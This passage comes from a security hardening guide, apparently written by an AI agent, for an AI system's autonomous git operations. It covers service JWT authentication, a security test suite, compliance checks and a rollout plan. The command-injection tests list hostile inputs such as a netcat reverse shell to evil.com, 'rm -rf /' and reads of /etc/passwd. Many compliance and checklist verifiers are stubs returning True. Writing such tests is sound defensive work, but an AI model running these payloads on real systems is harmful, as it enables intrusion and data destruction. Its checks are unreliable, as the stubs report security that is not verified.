                "stdout": "",
                "stderr": "Execution timed out"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "stdout": "",
                "stderr": f"Execution error: {e}"
            }
```

## Integration Security for Cross-Service Coordination

### Service-to-Service Authentication

```python
import jwt
import time
import hashlib
from typing import Dict, Optional, List
from dataclasses import dataclass
import aiohttp
import asyncio

@dataclass
class ServiceCredentials:
    """Service authentication credentials."""
    service_name: str
    api_key: str
    jwt_secret: str
    allowed_operations: List[str]
    rate_limit_per_minute: int = 60

class ServiceAuthenticationManager:
    """Manage authentication between Echo Brain and Tower services."""

    def __init__(self, credential_manager: SecureCredentialManager):
        self.credential_manager = credential_manager
        self.service_registry: Dict[str, ServiceCredentials] = {}
        self.active_tokens: Dict[str, Dict] = {}

    async def register_service(self, service_name: str, credentials: ServiceCredentials):
        """Register service for cross-communication."""
        self.service_registry[service_name] = credentials

        # Store credentials securely
        await self.credential_manager.store_credential(
            f"service_{service_name}_api_key",
            credentials.api_key
        )
        await self.credential_manager.store_credential(
            f"service_{service_name}_jwt_secret",
            credentials.jwt_secret
        )

    async def generate_service_token(self, requesting_service: str, target_service: str) -> Optional[str]:
        """Generate JWT token for service-to-service communication."""

        if requesting_service not in self.service_registry:
            return None

        if target_service not in self.service_registry:
            return None

        # Get JWT secret for target service
        jwt_secret = await self.credential_manager.retrieve_credential(
            f"service_{target_service}_jwt_secret"
        )

        if not jwt_secret:
            return None

        # Create token payload
        payload = {
            'iss': requesting_service,  # Issuer (requesting service)
            'aud': target_service,     # Audience (target service)
            'iat': int(time.time()),   # Issued at
            'exp': int(time.time()) + 300,  # Expires in 5 minutes
            'sub': 'service_communication',
            'scope': self.service_registry[requesting_service].allowed_operations
        }

        # Generate token
        token = jwt.encode(payload, jwt_secret, algorithm='HS256')

        # Store active token for tracking
        token_id = hashlib.sha256(token.encode()).hexdigest()[:16]
        self.active_tokens[token_id] = {
            'requesting_service': requesting_service,
            'target_service': target_service,
            'created_at': time.time(),
            'expires_at': payload['exp']
        }

        return token

    async def validate_service_request(self, token: str, requested_operation: str) -> Dict[str, Any]:
        """Validate incoming service request token."""
        try:
            # Decode token without verification first to get audience
            unverified_payload = jwt.decode(token, options={"verify_signature": False})
            target_service = unverified_payload.get('aud')

            if not target_service or target_service not in self.service_registry:
                return {"valid": False, "error": "Invalid target service"}

            # Get JWT secret for verification
            jwt_secret = await self.credential_manager.retrieve_credential(
                f"service_{target_service}_jwt_secret"
            )

            # Verify token
            payload = jwt.decode(token, jwt_secret, algorithms=['HS256'])

            # Check if operation is allowed
            allowed_operations = payload.get('scope', [])
            if requested_operation not in allowed_operations:
                return {"valid": False, "error": "Operation not permitted"}

            # Rate limiting check
            if not await self._check_rate_limit(payload['iss'], target_service):
                return {"valid": False, "error": "Rate limit exceeded"}

            return {
                "valid": True,
                "requesting_service": payload['iss'],
                "target_service": payload['aud'],
                "allowed_operations": allowed_operations
            }

        except jwt.ExpiredSignatureError:
            return {"valid": False, "error": "Token expired"}
        except jwt.InvalidTokenError as e:
            return {"valid": False, "error": f"Invalid token: {e}"}

    async def _check_rate_limit(self, requesting_service: str, target_service: str) -> bool:
        """Check rate limiting for service requests."""
        # Implementation would use Redis or in-memory cache
        # This is a placeholder
        return True

    async def revoke_service_token(self, token: str) -> bool:
        """Revoke active service token."""
        token_id = hashlib.sha256(token.encode()).hexdigest()[:16]
        if token_id in self.active_tokens:
            del self.active_tokens[token_id]
            return True
        return False

class SecureServiceClient:
    """Secure client for making requests to other Tower services."""

    def __init__(self, service_name: str, auth_manager: ServiceAuthenticationManager):
        self.service_name = service_name
        self.auth_manager = auth_manager
        self.session = None

    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={
                'User-Agent': f'EchoBrain-{self.service_name}/1.0',
                'Content-Type': 'application/json'
            }
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def make_authenticated_request(
        self,
        target_service: str,
        operation: str,
        endpoint: str,
        method: str = 'POST',
        data: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """Make authenticated request to another Tower service."""

        # Generate service token
        token = await self.auth_manager.generate_service_token(
            self.service_name, target_service
        )

        if not token:
            return {"error": "Failed to generate authentication token"}

        # Determine service URL based on target service
        service_urls = {
            'tower-dashboard': 'https://***REMOVED***/',
            'tower-kb': 'https://***REMOVED***/kb',
            'tower-auth': 'https://***REMOVED***/api/auth',
            'tower-agent-manager': 'https://***REMOVED***/agent-manager'
        }

        base_url = service_urls.get(target_service)
        if not base_url:
            return {"error": f"Unknown target service: {target_service}"}

        full_url = f"{base_url.rstrip('/')}/{endpoint.lstrip('/')}"

        headers = {
            'Authorization': f'Bearer {token}',
            'X-Service-Operation': operation,
            'X-Requesting-Service': self.service_name
        }

        try:
            async with self.session.request(
                method, full_url, headers=headers, json=data
            ) as response:
                response_data = await response.json()

                # Log the service interaction
                await self._log_service_interaction(
                    target_service, operation, endpoint, response.status
                )

                return {
                    "success": response.status < 400,
                    "status_code": response.status,
                    "data": response_data
                }

        except Exception as e:
            await self._log_service_interaction(
                target_service, operation, endpoint, 0, str(e)
            )
            return {"error": f"Request failed: {e}"}

    async def _log_service_interaction(
        self,
        target_service: str,
        operation: str,
        endpoint: str,
        status_code: int,
        error: Optional[str] = None
    ):
        """Log service-to-service interactions for audit."""
        log_entry = {
            "timestamp": time.time(),
            "requesting_service": self.service_name,
            "target_service": target_service,
            "operation": operation,
            "endpoint": endpoint,
            "status_code": status_code,
            "success": status_code < 400 and not error,
            "error": error
        }

        # Log to audit system
        logging.info(f"Service interaction: {log_entry}")

class GitOperationCoordinator:
    """Coordinate git operations across Tower services."""

    def __init__(self, auth_manager: ServiceAuthenticationManager):
        self.auth_manager = auth_manager

    async def coordinate_git_deployment(
        self,
        repository: str,
        branch: str,
        services_to_update: List[str]
    ) -> Dict[str, Any]:
        """Coordinate git deployment across multiple services."""

        coordination_id = hashlib.sha256(
            f"{repository}:{branch}:{int(time.time())}".encode()
        ).hexdigest()[:16]

        results = {}

        async with SecureServiceClient('echo-brain', self.auth_manager) as client:
            # Phase 1: Notify services of pending deployment
            notify_tasks = []
            for service in services_to_update:
                task = self._notify_service_deployment(
                    client, service, coordination_id, repository, branch
                )
                notify_tasks.append(task)

            notification_results = await asyncio.gather(*notify_tasks, return_exceptions=True)

            # Phase 2: Execute deployment if all services ready
            ready_services = []
            for i, result in enumerate(notification_results):
                service = services_to_update[i]
                if isinstance(result, dict) and result.get("ready", False):
                    ready_services.append(service)
                else:
                    results[service] = {"status": "not_ready", "error": str(result)}

            # Phase 3: Deploy to ready services
            if ready_services:
                deploy_tasks = []
                for service in ready_services:
                    task = self._deploy_to_service(
                        client, service, coordination_id, repository, branch
                    )
                    deploy_tasks.append(task)

                deployment_results = await asyncio.gather(*deploy_tasks, return_exceptions=True)

                for i, result in enumerate(deployment_results):
                    service = ready_services[i]
                    results[service] = result if isinstance(result, dict) else {"error": str(result)}

        return {
            "coordination_id": coordination_id,
            "repository": repository,
            "branch": branch,
            "results": results,
            "overall_success": all(
                r.get("status") == "deployed" for r in results.values()
            )
        }

    async def _notify_service_deployment(
        self,
        client: SecureServiceClient,
        service: str,
        coordination_id: str,
        repository: str,
        branch: str
    ) -> Dict[str, Any]:
        """Notify service of pending deployment."""

        return await client.make_authenticated_request(
            target_service=service,
            operation="git_deployment_notify",
            endpoint="/api/deployment/notify",
            data={
                "coordination_id": coordination_id,
                "repository": repository,
                "branch": branch,
                "action": "prepare_deployment"
            }
        )

    async def _deploy_to_service(
        self,
        client: SecureServiceClient,
        service: str,
        coordination_id: str,
        repository: str,
        branch: str
    ) -> Dict[str, Any]:
        """Deploy to specific service."""

        return await client.make_authenticated_request(
            target_service=service,
            operation="git_deployment_execute",
            endpoint="/api/deployment/execute",
            data={
                "coordination_id": coordination_id,
                "repository": repository,
                "branch": branch,
                "action": "execute_deployment"
            }
        )
```

## Security Testing Framework and Compliance Checklist

### Automated Security Testing Suite

```python
import asyncio
import subprocess
import tempfile
from pathlib import Path
import pytest
import json
from typing import List, Dict, Any

class GitSecurityTestSuite:
    """Comprehensive security test suite for git operations."""

    def __init__(self, secure_executor: SecureGitExecutor):
        self.secure_executor = secure_executor
        self.test_results: List[Dict[str, Any]] = []

    async def run_all_tests(self) -> Dict[str, Any]:
        """Run complete security test suite."""

        test_methods = [
            self.test_command_injection,
            self.test_path_traversal,
            self.test_privilege_escalation,
            self.test_credential_exposure,
            self.test_access_control,
            self.test_audit_logging,
            self.test_resource_limits,
            self.test_input_validation
        ]

        results = {}

        for test_method in test_methods:
            try:
                result = await test_method()
                results[test_method.__name__] = result
            except Exception as e:
                results[test_method.__name__] = {
                    "passed": False,
                    "error": str(e),
                    "severity": "critical"
                }

        return {
            "test_suite": "GitSecurityTests",
            "timestamp": datetime.now().isoformat(),
            "results": results,
            "summary": self._generate_test_summary(results)
        }

    async def test_command_injection(self) -> Dict[str, Any]:
        """Test for command injection vulnerabilities."""

        malicious_inputs = [
            "; rm -rf /",
            "$(curl evil.com)",
            "`whoami`",
            "&& cat /etc/passwd",
            "| nc evil.com 4444 -e /bin/sh",
            "--upload-pack='rm -rf /'",
            "../../etc/passwd",
            "${IFS}cat${IFS}/etc/passwd"
        ]

        vulnerabilities_found = []

        for malicious_input in malicious_inputs:
            try:
                # Try to inject malicious command
                result = await self.secure_executor.execute_git_command(
                    "status", [malicious_input]
                )

                # If command succeeded, it might be vulnerable
                if result["success"]:
                    vulnerabilities_found.append({
                        "input": malicious_input,
                        "result": result,
                        "risk": "Command injection possible"
                    })

            except Exception:
                # Exception is expected for malicious input
                pass

        return {
            "passed": len(vulnerabilities_found) == 0,
            "vulnerabilities_found": len(vulnerabilities_found),
            "details": vulnerabilities_found,
            "severity": "critical" if vulnerabilities_found else "low"
        }

    async def test_path_traversal(self) -> Dict[str, Any]:
        """Test for path traversal vulnerabilities."""

        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\cmd.exe",
            "/../../../../etc/shadow",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]

        vulnerabilities_found = []

        for path_attempt in path_traversal_attempts:
            try:
                result = await self.secure_executor.execute_git_command(
                    "add", [path_attempt]
                )

                # Check if path traversal was successful
                if result["success"] and "etc/passwd" in result.get("stdout", ""):
                    vulnerabilities_found.append({
                        "path": path_attempt,
                        "result": result
                    })

            except Exception:
                # Exception is expected
                pass

        return {
            "passed": len(vulnerabilities_found) == 0,
            "vulnerabilities_found": len(vulnerabilities_found),
            "details": vulnerabilities_found,
            "severity": "high" if vulnerabilities_found else "low"
        }

    async def test_privilege_escalation(self) -> Dict[str, Any]:
        """Test for privilege escalation vulnerabilities."""

        escalation_attempts = [
            "chmod 777 /etc/passwd",
            "sudo su -",
            "su root",
            "setuid root"
        ]

        escalation_detected = []

        # This would test if git operations can be used to escalate privileges
        # Implementation depends on specific security model

        return {
            "passed": len(escalation_detected) == 0,
            "escalations_detected": len(escalation_detected),
            "severity": "critical" if escalation_detected else "low"
        }

    async def test_credential_exposure(self) -> Dict[str, Any]:
        """Test for credential exposure in logs and output."""

        # Test if credentials appear in logs
        sensitive_patterns = [
            r'password\s*[:=]\s*\w+',
            r'token\s*[:=]\s*[a-zA-Z0-9]+',
            r'secret\s*[:=]\s*\w+',
            r'key\s*[:=]\s*[a-zA-Z0-9]+',
            r'-----BEGIN.*PRIVATE KEY-----'
        ]

        exposures_found = []

        # Check recent git operations for credential exposure
        try:
            result = await self.secure_executor.execute_git_command("log", ["--oneline", "-n", "5"])

            import re
            for pattern in sensitive_patterns:
                matches = re.findall(pattern, result.get("stdout", ""), re.IGNORECASE)
                if matches:
                    exposures_found.extend(matches)

        except Exception:
            pass

        return {
            "passed": len(exposures_found) == 0,
            "exposures_found": len(exposures_found),
            "details": exposures_found,
            "severity": "critical" if exposures_found else "low"
        }

    async def test_access_control(self) -> Dict[str, Any]:
        """Test access control enforcement."""

        access_controller = GitAccessController(logging.getLogger())

        test_cases = [
            {
                "user": "anonymous",
                "permission": GitPermission.FORCE_PUSH,
                "repo": "tower-echo-brain",
                "should_pass": False
            },
            {
                "user": "echo_brain",
                "permission": GitPermission.CREATE_BRANCH,
                "repo": "tower-echo-brain",
                "should_pass": True
            },
            {
                "user": "unauthorized",
                "permission": GitPermission.ADMIN,
                "repo": "tower-echo-brain",
                "should_pass": False
            }
        ]

        failures = []

        for case in test_cases:
            result, message = await access_controller.check_permission(
                case["user"], case["permission"], case["repo"]
            )

            if result != case["should_pass"]:
                failures.append({
                    "test_case": case,
                    "expected": case["should_pass"],
                    "actual": result,
                    "message": message
                })

        return {
            "passed": len(failures) == 0,
            "test_cases": len(test_cases),
            "failures": len(failures),
            "details": failures,
            "severity": "high" if failures else "low"
        }

    async def test_audit_logging(self) -> Dict[str, Any]:
        """Test audit logging completeness."""

        # Perform a git operation and verify it's logged
        test_operation_logged = False

        try:
            # Execute a test operation
            result = await self.secure_executor.execute_git_command("status", [])

            # Check if operation was logged
            # Implementation would check actual audit logs
            test_operation_logged = True  # Placeholder

        except Exception:
            pass

        return {
            "passed": test_operation_logged,
            "audit_logging_functional": test_operation_logged,
            "severity": "medium" if not test_operation_logged else "low"
        }

    async def test_resource_limits(self) -> Dict[str, Any]:
        """Test resource limit enforcement."""

        resource_limits_working = True
        limit_failures = []

        # Test memory limits
        try:
            # This would test if memory limits are enforced
            pass
        except Exception as e:
            limit_failures.append(f"Memory limit test failed: {e}")

        # Test CPU limits
        try:
            # This would test if CPU limits are enforced
            pass
        except Exception as e:
            limit_failures.append(f"CPU limit test failed: {e}")

        return {
            "passed": len(limit_failures) == 0,
            "limit_failures": limit_failures,
            "severity": "medium" if limit_failures else "low"
        }

    async def test_input_validation(self) -> Dict[str, Any]:
        """Test input validation effectiveness."""

        invalid_inputs = [
            "",  # Empty input
            "x" * 10000,  # Very long input
            "\x00\x01\x02",  # Binary data
            "normal_file\x00malicious_file",  # Null byte injection
            "file with unicode: \u0000\u001f"
        ]

        validation_failures = []

        for invalid_input in invalid_inputs:
            try:
                result = await self.secure_executor.execute_git_command("add", [invalid_input])

                # If validation is working, these should fail
                if result["success"]:
                    validation_failures.append({
                        "input": repr(invalid_input),
                        "should_have_failed": True
                    })

            except Exception:
                # Validation working as expected
                pass

        return {
            "passed": len(validation_failures) == 0,
            "validation_failures": len(validation_failures),
            "details": validation_failures,
            "severity": "medium" if validation_failures else "low"
        }

    def _generate_test_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate test summary."""

        total_tests = len(results)
        passed_tests = sum(1 for r in results.values() if r.get("passed", False))
        critical_failures = sum(1 for r in results.values() if r.get("severity") == "critical")
        high_failures = sum(1 for r in results.values() if r.get("severity") == "high")

        return {
            "total_tests": total_tests,
            "passed_tests": passed_tests,
            "failed_tests": total_tests - passed_tests,
            "critical_failures": critical_failures,
            "high_failures": high_failures,
            "overall_security_score": (passed_tests / total_tests) * 100 if total_tests > 0 else 0
        }

class ComplianceChecker:
    """Validate compliance with security standards."""

    def __init__(self):
        self.compliance_requirements = self._load_compliance_requirements()

    def _load_compliance_requirements(self) -> Dict[str, Any]:
        """Load compliance requirements from configuration."""
        return {
            "encryption": {
                "credentials_encrypted": True,
                "min_key_length": 256,
                "allowed_algorithms": ["AES-256", "Fernet"]
            },
            "audit": {
                "all_operations_logged": True,
                "log_retention_days": 90,
                "tamper_proof_logs": True
            },
            "access_control": {
                "role_based_access": True,
                "principle_of_least_privilege": True,
                "regular_access_reviews": True
            },
            "authentication": {
                "multi_factor_required": False,  # For autonomous systems
                "token_expiration": 300,  # 5 minutes
                "secure_token_storage": True
            }
        }

    async def check_encryption_compliance(self) -> Dict[str, Any]:
        """Check encryption compliance."""

        checks = {
            "credentials_encrypted": await self._verify_credential_encryption(),
            "strong_encryption_used": await self._verify_encryption_strength(),
            "key_rotation_implemented": await self._verify_key_rotation()
        }

        return {
            "compliant": all(checks.values()),
            "checks": checks,
            "requirements_met": sum(checks.values()),
            "total_requirements": len(checks)
        }

    async def check_audit_compliance(self) -> Dict[str, Any]:
        """Check audit logging compliance."""

        checks = {
            "comprehensive_logging": await self._verify_comprehensive_logging(),
            "log_integrity": await self._verify_log_integrity(),
            "retention_policy": await self._verify_retention_policy(),
            "audit_trail_completeness": await self._verify_audit_completeness()
        }

        return {
            "compliant": all(checks.values()),
            "checks": checks,
            "requirements_met": sum(checks.values()),
            "total_requirements": len(checks)
        }

    async def check_access_control_compliance(self) -> Dict[str, Any]:
        """Check access control compliance."""

        checks = {
            "rbac_implemented": await self._verify_rbac_implementation(),
            "least_privilege": await self._verify_least_privilege(),
            "access_reviews": await self._verify_access_reviews(),
            "segregation_of_duties": await self._verify_segregation_duties()
        }

        return {
            "compliant": all(checks.values()),
            "checks": checks,
            "requirements_met": sum(checks.values()),
            "total_requirements": len(checks)
        }

    async def generate_compliance_report(self) -> Dict[str, Any]:
        """Generate comprehensive compliance report."""

        encryption_compliance = await self.check_encryption_compliance()
        audit_compliance = await self.check_audit_compliance()
        access_compliance = await self.check_access_control_compliance()

        total_requirements = (
            encryption_compliance["total_requirements"] +
            audit_compliance["total_requirements"] +
            access_compliance["total_requirements"]
        )

        requirements_met = (
            encryption_compliance["requirements_met"] +
            audit_compliance["requirements_met"] +
            access_compliance["requirements_met"]
        )

        overall_compliance_score = (requirements_met / total_requirements) * 100

        return {
            "report_date": datetime.now().isoformat(),
            "overall_compliance_score": overall_compliance_score,
            "compliant": overall_compliance_score >= 95,  # 95% threshold
            "areas": {
                "encryption": encryption_compliance,
                "audit": audit_compliance,
                "access_control": access_compliance
            },
            "recommendations": self._generate_compliance_recommendations(
                encryption_compliance, audit_compliance, access_compliance
            )
        }

    # Verification methods (placeholders - would implement actual checks)
    async def _verify_credential_encryption(self) -> bool:
        return True

    async def _verify_encryption_strength(self) -> bool:
        return True

    async def _verify_key_rotation(self) -> bool:
        return True

    async def _verify_comprehensive_logging(self) -> bool:
        return True

    async def _verify_log_integrity(self) -> bool:
        return True

    async def _verify_retention_policy(self) -> bool:
        return True

    async def _verify_audit_completeness(self) -> bool:
        return True

    async def _verify_rbac_implementation(self) -> bool:
        return True

    async def _verify_least_privilege(self) -> bool:
        return True

    async def _verify_access_reviews(self) -> bool:
        return False  # Needs implementation

    async def _verify_segregation_duties(self) -> bool:
        return True

    def _generate_compliance_recommendations(self, *compliance_results) -> List[str]:
        """Generate recommendations based on compliance results."""
        recommendations = []

        for result in compliance_results:
            for check_name, passed in result["checks"].items():
                if not passed:
                    recommendations.append(f"Implement {check_name.replace('_', ' ')}")

        return recommendations

# Production Deployment Checklist

class ProductionDeploymentChecklist:
    """Checklist for secure production deployment."""

    CHECKLIST_ITEMS = [
        {
            "id": "SEC-001",
            "category": "Security",
            "item": "Command injection vulnerabilities fixed",
            "critical": True,
            "verification_method": "security_test_suite"
        },
        {
            "id": "SEC-002",
            "category": "Security",
            "item": "Credentials moved to secure storage",
            "critical": True,
            "verification_method": "credential_audit"
        },
        {
            "id": "SEC-003",
            "category": "Security",
            "item": "SSH key rotation implemented",
            "critical": True,
            "verification_method": "ssh_key_audit"
        },
        {
            "id": "ACC-001",
            "category": "Access Control",
            "item": "RBAC system implemented",
            "critical": True,
            "verification_method": "access_control_test"
        },
        {
            "id": "AUD-001",
            "category": "Audit",
            "item": "Comprehensive audit logging enabled",
            "critical": True,
            "verification_method": "audit_log_verification"
        },
        {
            "id": "MON-001",
            "category": "Monitoring",
            "item": "Security monitoring configured",
            "critical": False,
            "verification_method": "monitoring_check"
        },
        {
            "id": "DOC-001",
            "category": "Documentation",
            "item": "Security procedures documented",
            "critical": False,
            "verification_method": "documentation_review"
        }
    ]

    async def run_deployment_checklist(self) -> Dict[str, Any]:
        """Run complete deployment checklist."""

        results = {}
        critical_failures = []

        for item in self.CHECKLIST_ITEMS:
            verification_result = await self._verify_checklist_item(item)
            results[item["id"]] = {
                "item": item["item"],
                "category": item["category"],
                "critical": item["critical"],
                "passed": verification_result,
                "verification_method": item["verification_method"]
            }

            if item["critical"] and not verification_result:
                critical_failures.append(item["item"])

        deployment_ready = len(critical_failures) == 0

        return {
            "deployment_ready": deployment_ready,
            "critical_failures": critical_failures,
            "checklist_results": results,
            "summary": {
                "total_items": len(self.CHECKLIST_ITEMS),
                "passed_items": sum(1 for r in results.values() if r["passed"]),
                "critical_items": len([i for i in self.CHECKLIST_ITEMS if i["critical"]]),
                "critical_failures": len(critical_failures)
            }
        }

    async def _verify_checklist_item(self, item: Dict[str, Any]) -> bool:
        """Verify individual checklist item."""

        verification_method = item["verification_method"]

        # Route to appropriate verification method
        if verification_method == "security_test_suite":
            return await self._verify_security_tests()
        elif verification_method == "credential_audit":
            return await self._verify_credential_security()
        elif verification_method == "ssh_key_audit":
            return await self._verify_ssh_key_management()
        elif verification_method == "access_control_test":
            return await self._verify_access_control()
        elif verification_method == "audit_log_verification":
            return await self._verify_audit_logging()
        elif verification_method == "monitoring_check":
            return await self._verify_monitoring()
        elif verification_method == "documentation_review":
            return await self._verify_documentation()
        else:
            return False

    # Verification methods (would implement actual verification logic)
    async def _verify_security_tests(self) -> bool:
        return True

    async def _verify_credential_security(self) -> bool:
        return True

    async def _verify_ssh_key_management(self) -> bool:
        return True

    async def _verify_access_control(self) -> bool:
        return True

    async def _verify_audit_logging(self) -> bool:
        return True

    async def _verify_monitoring(self) -> bool:
        return False

    async def _verify_documentation(self) -> bool:
        return True
```

## Implementation Timeline and Next Steps

### Immediate Actions (This Week)

1. **CRITICAL: Fix Command Injection (Day 1)**
   - Replace vulnerable `subprocess.run()` calls in `/opt/tower-echo-brain/src/execution/git_operations.py`
   - Implement `SecureGitExecutor` class with input validation
   - Test with security test suite

2. **CRITICAL: Secure Credentials (Day 2)**
   - Run credential migration script
   - Move database passwords to encrypted storage
   - Update all services to use secure credential retrieval

3. **HIGH: Basic Audit Logging (Day 3)**
   - Implement `GitAuditLogger` class
   - Set up database schema for audit events
   - Enable logging for all git operations

### Week 1 Implementation Plan

**Day 1-2: Critical Security Fixes**
- Fix command injection vulnerabilities
- Implement secure credential storage
- Deploy basic input validation

**Day 3-4: Access Control Implementation**
- Deploy RBAC system
- Configure repository-specific permissions
- Test access control enforcement

**Day 5-7: Monitoring and Testing**
- Set up audit logging
- Deploy security monitoring
- Run comprehensive security test suite

### Weeks 2-4: Advanced Security Features

**Week 2: Sandboxing and Isolation**
- Implement Docker-based sandboxing
- Deploy resource-limited execution
- Test container security

**Week 3: Advanced Monitoring**
- Deploy anomaly detection
- Set up forensic analysis capabilities
- Configure SIEM integration

**Week 4: Production Hardening**
- Complete security audit
- Penetration testing
- Performance optimization

### Success Metrics

**Security Metrics:**
- Zero critical security vulnerabilities
- 100% audit trail coverage
- <5 second response time for git operations
- 99.9% authentication success rate

**Compliance Metrics:**
- 95%+ compliance score
- All critical checklist items passed
- Regular security assessments completed

## Conclusion

This implementation guide provides a comprehensive roadmap for securing Echo Brain's git operations. The current system poses **CRITICAL SECURITY RISKS** that require immediate attention.

**IMMEDIATE ACTIONS REQUIRED:**
1. Fix command injection vulnerabilities
2. Secure credential storage
3. Implement basic access controls
4. Enable audit logging

With proper implementation of this security framework, Echo Brain will achieve enterprise-grade security for autonomous git operations while maintaining the flexibility required for advanced AI capabilities.

**Status: REQUIRES IMMEDIATE IMPLEMENTATION**
**Priority: CRITICAL**
**Timeline: Begin implementation immediately**

<function_calls>
<invoke name="TodoWrite">
<parameter name="todos">[{"content": "Analyze current Echo Brain git operation security status", "status": "completed", "activeForm": "Analyzing current Echo Brain git operation security status"}, {"content": "Design credential management architecture for autonomous git operations", "status": "completed", "activeForm": "Designing credential management architecture for autonomous git operations"}, {"content": "Create access control framework with role-based permissions", "status": "completed", "activeForm": "Creating access control framework with role-based permissions"}, {"content": "Design audit and monitoring system for git operations", "status": "in_progress", "activeForm": "Designing audit and monitoring system for git operations"}, {"content": "Implement secure execution environment with sandboxing", "status": "pending", "activeForm": "Implementing secure execution environment with sandboxing"}, {"content": "Design integration security for cross-service coordination", "status": "pending", "activeForm": "Designing integration security for cross-service coordination"}, {"content": "Create security testing framework and compliance checklist", "status": "pending", "activeForm": "Creating security testing framework and compliance checklist"}]